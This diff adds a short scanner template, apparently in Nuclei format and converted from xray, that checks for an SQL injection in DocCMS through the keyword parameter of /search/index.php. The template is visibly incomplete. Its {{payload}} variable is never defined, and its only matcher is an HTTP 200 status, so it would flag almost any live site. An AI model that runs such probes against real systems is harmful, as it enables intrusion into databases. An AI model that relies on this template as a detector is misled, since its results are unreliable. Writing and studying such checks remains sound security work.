@@ -1,0 +1,21 @@
+id: poc-yaml-doccms-sqli
+
+info:
+  name: poc-yaml-doccms-sqli
+  author: sodme
+  severity: high
+  tags: xray-converted,sqli,ct-416442
+  reference:
+    - https://www.yuque.com/peiqiwiki/peiqi-poc-wiki/yyxv0r
+
+http:
+  - raw:
+      - |
+        GET /search/index.php?keyword={{payload}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
